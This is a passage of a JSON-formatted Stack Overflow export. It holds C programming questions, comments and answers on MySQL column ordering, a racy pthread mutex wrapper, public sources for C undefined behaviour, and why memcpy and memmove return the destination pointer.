statement?</a>, but I found it different from my case as I need to assign an arbitrary number of column ordinals.</p>\n\n<p><strong>Edit:</strong></p>\n\n<p><strong>Current situation</strong></p>\n\n<p>query: <code>SELECT A.a, A.b, A.c FROM tbl1 A INNER JOIN tbl2 B ON B.id = A.B_id</code></p>\n\n<p>c code: </p>\n\n<pre><code>...\nMYSQL_ROW row = mysql_fetch_row(result);\nunsigned long *lengths = mysql_fetch_lengths(result);\n...\nint field1 = atoi(row[0]);\nmemcpy(row[1], field2, lengths[1]); \n..continue for each row..\n</code></pre>\n\n<p><strong>Desired situation</strong></p>\n\n<p>query: <code>SELECT A.a ORDINAL 1, A.b ORDINAL 2, A.c ORDINAL 3 FROM tbl1 A INNER JOIN tbl2 B ON B.id = A.B_id</code></p>\n\n<p>c code: same as above.</p>\n\n<p>Where <code>ORDINAL</code> statements are pseudo-SQL statements that would allow the returned columns to be ordered at wish.</p>\n"}, {"tags": ["c", "concurrency"], "comments": [{"owner": {"reputation": 1209, "user_id": 4217072, "user_type": "registered", "accept_rate": 89, "profile_image": "https://lh4.googleusercontent.com/-d9p4Q8FtKsk/AAAAAAAAAAI/AAAAAAAAAC4/5Kn4PPeQKSI/photo.jpg?sz=128", "display_name": "LambdaBeta", "link": "https://stackoverflow.com/users/4217072/lambdabeta"}, "edited": false, "score": 0, "creation_date": 1476282374, "post_id": 40001143, "comment_id": 67280068, "body": "Change your error management. Seriously, just add return value checks and perror&#39;s to see what goes wrong. That is why the errors are there."}, {"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 1, "creation_date": 1476282443, "post_id": 40001143, "comment_id": 67280115, "body": "It&#39;s a common scenario that many threads might be attempting to lock at the same time. But why would multiple threads try to destroy at the same? Surely, a single thread at the &quot;end&quot; can do that?"}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1476282444, "post_id": 40001143, "comment_id": 67280116, "body": "Strange to have a thread trying to destroy a resource that other threads need..."}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "edited": false, "score": 2, "creation_date": 1476282801, "post_id": 40001143, "comment_id": 67280398, "body": "What&#39;s <code>valid</code>? You&#39;re modifying some global variable called <code>valid</code> while your lock/unlock functions check a struct member called <code>valid</code> that&#39;s never initialized."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "reply_to_user": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "edited": false, "score": 0, "creation_date": 1476284422, "post_id": 40001143, "comment_id": 67281569, "body": "@Art I hope is a type, since there is a  <code>valid </code> member inside struct so  <code>s-&gt;valid </code>"}, {"owner": {"reputation": 28131, "user_id": 1956010, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bfdcb4596e9da98cccbf9a0069fdff6c?s=128&d=identicon&r=PG", "display_name": "nwellnhof", "link": "https://stackoverflow.com/users/1956010/nwellnhof"}, "edited": false, "score": 0, "creation_date": 1476284600, "post_id": 40001143, "comment_id": 67281677, "body": "Have a look at condition variables (<i>pthread_cond_t</i>). But it&#39;s probably easier to tie the lifetime of your mutex to the <i>my_sem</i> struct."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1476328591, "post_id": 40001143, "comment_id": 67301270, "body": "If the code compiles as C, there must be a global variable <code>valid</code>; the <code>my_sem_init()</code> and <code>my_sem_destroy()</code> set the global variable, though the code tests <code>s-&gt;valid</code> (which is undoubtedly what was intended).  As there was only one global variable and access to it was not protected, all hell could break loose as written."}, {"owner": {"reputation": 1, "user_id": 7008399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/39a27540d7b62bf931ded882905eb9bd?s=128&d=identicon&r=PG&f=1", "display_name": "M0rd0r", "link": "https://stackoverflow.com/users/7008399/m0rd0r"}, "edited": false, "score": 0, "creation_date": 1476342236, "post_id": 40001143, "comment_id": 67306032, "body": "Sorry for the typo, I fixed &quot;valid&quot; with &quot;s-&gt;valid&quot;"}], "answers": [{"tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 1, "last_activity_date": 1476287479, "creation_date": 1476287479, "answer_id": 40002981, "question_id": 40001143, "link": "https://stackoverflow.com/questions/40001143/c-concurrency-issue/40002981#40002981", "title": "C - Concurrency Issue", "body": "<p>The design you present has a chicken-and-egg problem: the members <code>my_sem.valid</code> are intended to indicate to multiple threads whether a given mutex is in a valid state, but multiple threads accessing those members produces a data race when one of the accesses is a write, and the accesses are not ordered with respect to each other (such as by protecting access with a mutex).</p>\n\n<p>Moreover, you cannot solve this problem by adjusting the type of <code>valid</code> to one that can be updated atomically, because initialization / finalization of the mutex and update of <code>valid</code> must be performed as an indivisible unit for your functions to work properly.  This <em>requires</em> engaging another mutex, a semaphore, or some similar synchronization aid.</p>\n\n<p>You do not solve anything by adding an additional synchronization object to your structure, however, because if you cannot rely on the existing mutex to be in a known state, then neither can you rely on the state of the new object.  To rescue this design, therefore, you need a global mutex or semaphore with which the body of each of the four functions is protected.</p>\n\n<p>Here's an alternative: don't hand out uninitialized mutexes, and don't destroy mutexes that are (or may still be) in use.  If necessary, you can even use the mutex itself to protect tests of whether it is still in use, provided that you structure your code to avoid any possibility of re-testing the in-use state of any mutex after once finding that mutex not in use.  This will require changes to how you use your mutexes, to your mutex management functions, and to your <code>struct</code> (if you retain the struct at all).</p>\n"}], "owner": {"reputation": 1, "user_id": 7008399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/39a27540d7b62bf931ded882905eb9bd?s=128&d=identicon&r=PG&f=1", "display_name": "M0rd0r", "link": "https://stackoverflow.com/users/7008399/m0rd0r"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 163, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1476341809, "creation_date": 1476282275, "last_edit_date": 1476341809, "question_id": 40001143, "link": "https://stackoverflow.com/questions/40001143/c-concurrency-issue", "title": "C - Concurrency Issue", "body": "<p>I have a problem with my code developed in C on Linux.</p>\n\n<p>I have a structure like :</p>\n\n<pre><code>typedef struct _my_sem {\n    unsigned int valid;\n    pthread_mutex_t m;\n} my_sem;\n</code></pre>\n\n<p>and the following functions (error management is NOT reported) :</p>\n\n<pre><code>void my_sem_init(my_sem *s);\nvoid my_sem_destroy(my_sem *s);\nvoid my_sem_lock(my_sem *s);\nvoid my_sem_unlock(my_sem *s);\n\n\nvoid my_sem_init(my_sem *s)\n{\n    pthread_mutex_create(&amp;s-&gt;m);\n    s-&gt;valid = 1;\n}\n\nvoid my_sem_destroy(my_sem *s)\n{\n    if (s-&gt;valid) {\n        pthread_mutex_destroy(&amp;s-&gt;m);\n        s-&gt;valid = 0;\n    }\n}\n\nvoid my_sem_lock(my_sem *s) {\n    if (s-&gt;valid)\n        pthread_mutex_lock(&amp;s-&gt;m);\n}\n\nvoid my_sem_unlock(my_sem *s) {\n    if (s-&gt;valid)\n        pthread_mutex_unlock(&amp;s-&gt;m);\n}\n</code></pre>\n\n<p>This code have a problem of concurrency. If someone is trying to lock my_sem\nand, in the same time someone is destroyng the objcet, the call will fail.</p>\n\n<p>How can I solve this problem of concurrency ?</p>\n"}, {"tags": ["c", "undefined-behavior"], "comments": [{"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 7, "creation_date": 1476281596, "post_id": 40000847, "comment_id": 67279491, "body": "<a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">Publicly available C11 pre-publication draft</a>."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1476281809, "post_id": 40000847, "comment_id": 67279641, "body": "For low price, take a look at <a href=\"http://stackoverflow.com/questions/38740708/c11-standard-docs\">this SO post</a>"}, {"owner": {"reputation": 759, "user_id": 3368561, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/e982eee26ab62e30ac026a9479e6228d?s=128&d=identicon&r=PG&f=1", "display_name": "user3368561", "link": "https://stackoverflow.com/users/3368561/user3368561"}, "reply_to_user": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 0, "creation_date": 1476282042, "post_id": 40000847, "comment_id": 67279821, "body": "@JohnBode Can you ensure that there are no significant differences between the draft and the official version? At least concerning this subject."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 4, "creation_date": 1476282165, "post_id": 40000847, "comment_id": 67279920, "body": "One who is <i>really</i> concerned about the differences, should go and buy the official release."}, {"owner": {"reputation": 759, "user_id": 3368561, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/e982eee26ab62e30ac026a9479e6228d?s=128&d=identicon&r=PG&f=1", "display_name": "user3368561", "link": "https://stackoverflow.com/users/3368561/user3368561"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1476282462, "post_id": 40000847, "comment_id": 67280130, "body": "@EugeneSh. This answer is right for a company, but not every particular can afford to buy all C standards (I&#39;m asking for all of them, not only one). Answers to this question must be useful to other people besides me."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 5, "creation_date": 1476282683, "post_id": 40000847, "comment_id": 67280308, "body": "Annex J Portability Issues of the standard is &#39;Informative&#39; (not &#39;Normative&#39;) and has 5 sections: J.1. Unspecified behaviour; J.2 Undefined behaviour; J.3 Implementation-defined behaviour; J.4 Locale-specific behaviour; J.5 Common extensions.  That&#39;s what you need.  What&#39;s in the drafts won&#39;t be significantly different from what&#39;s in the standard.  If you&#39;re concerned about differences, you have to buy the standard."}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "edited": false, "score": 2, "creation_date": 1476282979, "post_id": 40000847, "comment_id": 67280511, "body": "@user3368561 The standards cost money because they make money from people who really need an answer to the question &quot;Can you ensure that there are no significant differences between the draft and the official version?&quot;. As far as anyone knows, the last draft is exactly the same as the standard document. Want a better answer that doesn&#39;t contain &quot;as far as anyone knows&quot;? Pay them."}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1476284001, "post_id": 40000847, "comment_id": 67281254, "body": "ISO/IEC 9899:2011 does not get you any farther than N1570 in terms good programming practices. If you really care about code quality, try some coding standards guidelines like &quot;MISRA C&quot; and &quot;SEI CERT C&quot;."}], "owner": {"reputation": 759, "user_id": 3368561, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/e982eee26ab62e30ac026a9479e6228d?s=128&d=identicon&r=PG&f=1", "display_name": "user3368561", "link": "https://stackoverflow.com/users/3368561/user3368561"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 74, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1491233602, "creation_date": 1476281436, "last_edit_date": 1491233602, "question_id": 40000847, "link": "https://stackoverflow.com/questions/40000847/publicly-accessible-accurate-and-comprehensive-list-of-c-undefined-unspecified", "title": "Publicly accessible, accurate and comprehensive list of C undefined, unspecified and implementation defined behavior", "body": "<p>Undefined, unspecified and implementation defined behavior are fundamental concepts in writing safe and portable code in programming language C. Unfortunately, the only accurate and comprehensive source where to find information about these concepts is in the standards that define the language, all of them only accessible upon payment of a generous amount (there is a draft of C99 publicly accessible, but anything about ANSI C/C90, nor C11).</p>\n\n<p>Is there any publicly accessible, accurate and comprehensive list of C undefined, unspecified and implementation defined behavior?</p>\n"}, {"tags": ["c", "return-value", "function-call", "memmove"], "comments": [{"owner": {"reputation": 66610, "user_id": 2411320, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/5kF5N.jpg?s=128&g=1", "display_name": "gsamaras", "link": "https://stackoverflow.com/users/2411320/gsamaras"}, "edited": false, "score": 5, "creation_date": 1476279110, "post_id": 39999903, "comment_id": 67277588, "body": "Great, I will have to delay my lunch to see the answer to this... :) My hunch is that the last sentence of yours is the case."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1476279365, "post_id": 39999903, "comment_id": 67277798, "body": "&quot;... return a different pointer than dest?&quot; --&gt; With UB all things are possible, otherwise no."}, {"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 2, "creation_date": 1476279676, "post_id": 39999903, "comment_id": 67278038, "body": "Possible duplicate: <a href=\"http://stackoverflow.com/questions/13720428/whats-the-use-of-memset-return-value\" title=\"whats the use of memset return value\">stackoverflow.com/questions/13720428/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 26, "last_activity_date": 1476281380, "last_edit_date": 1592644375, "creation_date": 1476279185, "answer_id": 40000022, "question_id": 39999903, "link": "https://stackoverflow.com/questions/39999903/can-memcpy-or-memmove-return-a-different-pointer-than-dest/40000022#40000022", "title": "Can memcpy or memmove return a different pointer than dest?", "body": "<p>As per <code>C11</code>, chapter \u00a77.24.2.1 and \u00a77.24.2.2</p>\n<blockquote>\n<p><code>void *memcpy(void * restrict s1, const void * restrict s2, size_t n);</code></p>\n<p>[...] The <code>memcpy</code> function returns the value of <code>s1</code>.</p>\n</blockquote>\n<p>and,</p>\n<blockquote>\n<p><code>void *memmove(void *s1, const void *s2, size_t n);</code></p>\n<p>[...] The <code>memmove</code> function returns the value of <code>s1</code>.</p>\n</blockquote>\n<p>So, the functions will always return the pointer to the destination buffer, that's by design.</p>\n<p>Now coming to the <em><strong>why</strong></em> part, many functions are designed this way to make chaining of function calls possible. That way, you can have a call to <code>memmove()</code> as an argument to another function, where the copied value (<em>i.e, the pointer to <code>dest</code></em>) is going to be of some use.</p>\n<p>For example, you can write the shorter one</p>\n<pre><code> puts(memmove(dest_buffer, src_buffer, welcome_message_size));\n</code></pre>\n<p>instead of the longer one</p>\n<pre><code> memmove(dest_buffer, src_buffer, welcome_message_size);\n puts(dest_buffer);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 5450, "user_id": 2758823, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/9Nxaq.jpg?s=128&g=1", "display_name": "Giacomo Catenazzi", "link": "https://stackoverflow.com/users/2758823/giacomo-catenazzi"}, "reply_to_user": {"reputation": 161657, "user_id": 122718, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/213Kw.png?s=128&g=1", "display_name": "usr", "link": "https://stackoverflow.com/users/122718/usr"}, "edited": false, "score": 0, "creation_date": 1476302059, "post_id": 40000095, "comment_id": 67292465, "body": "@usr but it is the reason why most of string and memory function return the final pointer, or that you can do <code>a = b = c = d</code>.  Returning a value is very cheap, and BTW <code>void</code> is a <i>new</i> invention. Original K&amp;R C didn&#39;t have the <code>void</code>."}, {"owner": {"reputation": 161657, "user_id": 122718, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/213Kw.png?s=128&g=1", "display_name": "usr", "link": "https://stackoverflow.com/users/122718/usr"}, "edited": false, "score": 6, "creation_date": 1476303400, "post_id": 40000095, "comment_id": 67293160, "body": "Make it return nothing. This is not the concern of this function. String functions return a pointer because the pointer is calculated in an O(N) way (if I&#39;m wrong about that string functions should not return a pointer either)."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "reply_to_user": {"reputation": 161657, "user_id": 122718, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/213Kw.png?s=128&g=1", "display_name": "usr", "link": "https://stackoverflow.com/users/122718/usr"}, "edited": false, "score": 0, "creation_date": 1476310867, "post_id": 40000095, "comment_id": 67296746, "body": "@usr: It would make sense for functions like strcat to return a pointer to the end of the destination, but that isn&#39;t what they do.  Instead, they return a pointer to the start of a string."}, {"owner": {"reputation": 457342, "user_id": 87234, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/FkjBe.png?s=128&g=1", "display_name": "GManNickG", "link": "https://stackoverflow.com/users/87234/gmannickg"}, "edited": false, "score": 5, "creation_date": 1476319513, "post_id": 40000095, "comment_id": 67299059, "body": "This is a pretty weak argument, IMO. If you showed my the first example in a code review, I&#39;d ask you to turn it into the second. Why is it <code>memmove</code>&#39;s job to help you make one-liners? A much better return value would have been <code>dest + n</code>, because then you could chain things together: <code>dest = memcpy(dest, ...); dest = memcpy(dest.. ); etc</code>."}, {"owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "reply_to_user": {"reputation": 457342, "user_id": 87234, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/FkjBe.png?s=128&g=1", "display_name": "GManNickG", "link": "https://stackoverflow.com/users/87234/gmannickg"}, "edited": false, "score": 2, "creation_date": 1476323175, "post_id": 40000095, "comment_id": 67299904, "body": "@GManNickG To me, big part of the beauty of C is in its amazing one-liners. My personal favorite is <code>while ((*dest++ = *src++));</code> for string copying. Once I saw the semicolon at the end, I was hooked! I do agree with you that returning the end of the buffer, rather than its beginning, would make a lot more sense."}, {"owner": {"reputation": 38714, "user_id": 45668, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d4288118e4836464de401d53b60466dd?s=128&d=identicon&r=PG", "display_name": "Malcolm", "link": "https://stackoverflow.com/users/45668/malcolm"}, "edited": false, "score": 9, "creation_date": 1476350874, "post_id": 40000095, "comment_id": 67311269, "body": "@dasblinkenlight I&#39;d call it obscure rather than amazing, at least for anyone other than C programmers. If I want to copy strings in one line, I&#39;d rather just use <code>strcpy</code> anyway."}, {"owner": {"reputation": 161657, "user_id": 122718, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/213Kw.png?s=128&g=1", "display_name": "usr", "link": "https://stackoverflow.com/users/122718/usr"}, "edited": false, "score": 4, "creation_date": 1476370435, "post_id": 40000095, "comment_id": 67325967, "body": "The one liners in C are fascinating and kind of nice but they should be considered art, not production worthy code."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 161657, "user_id": 122718, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/213Kw.png?s=128&g=1", "display_name": "usr", "link": "https://stackoverflow.com/users/122718/usr"}, "edited": false, "score": 2, "creation_date": 1476816889, "post_id": 40000095, "comment_id": 67503334, "body": "@usr I think the general philosophy is that returning something is better than returning nothing. Even if the returned value is redundant, there might be situations where it&#39;s useful, like the chained calls in other answers. Why preclude such things?"}, {"owner": {"reputation": 161657, "user_id": 122718, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/213Kw.png?s=128&g=1", "display_name": "usr", "link": "https://stackoverflow.com/users/122718/usr"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1476817235, "post_id": 40000095, "comment_id": 67503532, "body": "@Barmar because it makes the API harder to understand at extremely low value added. It adds a completely unrelated computation to the API. That makes it harder to learn. If the return value is actually used the code is now harder to understand and verify as well."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 161657, "user_id": 122718, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/213Kw.png?s=128&g=1", "display_name": "usr", "link": "https://stackoverflow.com/users/122718/usr"}, "edited": false, "score": 0, "creation_date": 1476817583, "post_id": 40000095, "comment_id": 67503723, "body": "@usr C programmers are expected to be reasonably intelligent (they&#39;re supposed to be able to avoid array overflows without any automated checking). The designer presumably felt that this feature had more value than you do. You&#39;re entitled to your opinion, but that doesn&#39;t make it wrong."}, {"owner": {"reputation": 161657, "user_id": 122718, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/213Kw.png?s=128&g=1", "display_name": "usr", "link": "https://stackoverflow.com/users/122718/usr"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1476820076, "post_id": 40000095, "comment_id": 67505127, "body": "@Barmar who cares what they are expected to do. This is reducing productivity at no other benefit and is therefore objectively wrong. I understand the the designer disagrees with me. Why else would he have done that?! Many C APIs are disgustingly bad designed. Back then programmers were less experienced in API design."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 161657, "user_id": 122718, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/213Kw.png?s=128&g=1", "display_name": "usr", "link": "https://stackoverflow.com/users/122718/usr"}, "edited": false, "score": 0, "creation_date": 1476820275, "post_id": 40000095, "comment_id": 67505247, "body": "@usr You said this is a confusing API. If this is too confusing for a programmer, they shouldn&#39;t be using C, because it has far more confusing things than this, such as all the details you need to worry about to avoid buffer overflows."}, {"owner": {"reputation": 5541, "user_id": 4367864, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/mIepQ.png?s=128&g=1", "display_name": "PC Luddite", "link": "https://stackoverflow.com/users/4367864/pc-luddite"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1477428633, "post_id": 40000095, "comment_id": 67761381, "body": "@Barmar I agree with GManNickG and usr. This is a really weak argument. This &quot;feature&quot; serves no purpose. When C sacrifices readability and makes it more difficult for novices to understand, it generally has a better reason than &quot;it makes cool one-liners&quot;. It&#39;s not the job of the API to do this, and C programmers shouldn&#39;t be burdened with arbitrary complexity just because we&#39;re &quot;expected&quot; to. I would be more interested to know if there&#39;s a historical reason for this API."}, {"owner": {"reputation": 148, "user_id": 11590274, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-zPQgR33eROY/AAAAAAAAAAI/AAAAAAAABK4/HHqM25FNvFg/photo.jpg?sz=128", "display_name": "GuillemVS", "link": "https://stackoverflow.com/users/11590274/guillemvs"}, "reply_to_user": {"reputation": 38714, "user_id": 45668, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d4288118e4836464de401d53b60466dd?s=128&d=identicon&r=PG", "display_name": "Malcolm", "link": "https://stackoverflow.com/users/45668/malcolm"}, "edited": false, "score": 0, "creation_date": 1609356453, "post_id": 40000095, "comment_id": 115823834, "body": "@Malcolm yes, but <code>memmove</code> can overlap :O"}, {"owner": {"reputation": 38714, "user_id": 45668, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d4288118e4836464de401d53b60466dd?s=128&d=identicon&r=PG", "display_name": "Malcolm", "link": "https://stackoverflow.com/users/45668/malcolm"}, "reply_to_user": {"reputation": 148, "user_id": 11590274, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-zPQgR33eROY/AAAAAAAAAAI/AAAAAAAABK4/HHqM25FNvFg/photo.jpg?sz=128", "display_name": "GuillemVS", "link": "https://stackoverflow.com/users/11590274/guillemvs"}, "edited": false, "score": 0, "creation_date": 1609413276, "post_id": 40000095, "comment_id": 115837179, "body": "@GuillemVS That wasn&#39;t the point."}], "tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": true, "score": 43, "last_activity_date": 1476281686, "last_edit_date": 1476281686, "creation_date": 1476279378, "answer_id": 40000095, "question_id": 39999903, "link": "https://stackoverflow.com/questions/39999903/can-memcpy-or-memmove-return-a-different-pointer-than-dest/40000095#40000095", "title": "Can memcpy or memmove return a different pointer than dest?", "body": "<p><code>memmove</code> will never return anything other than <code>dest</code>.</p>\n\n<p>Returning <code>dest</code>, as opposed to making <code>memmove</code> void, is useful when the first argument is a computed expression, because it lets you avoid computing the same value upfront, and storing it in a variable. This lets you do in a single line</p>\n\n<pre><code>void *dest = memmove(&amp;buf[offset] + copiedSoFar, src + offset, sizeof(buf)-offset-copiedSoFar);\n</code></pre>\n\n<p>what you would otherwise need to do on two lines:</p>\n\n<pre><code>void *dest = &amp;buf[offset] + copiedSoFar;\nmemmove(dest, src + offset, 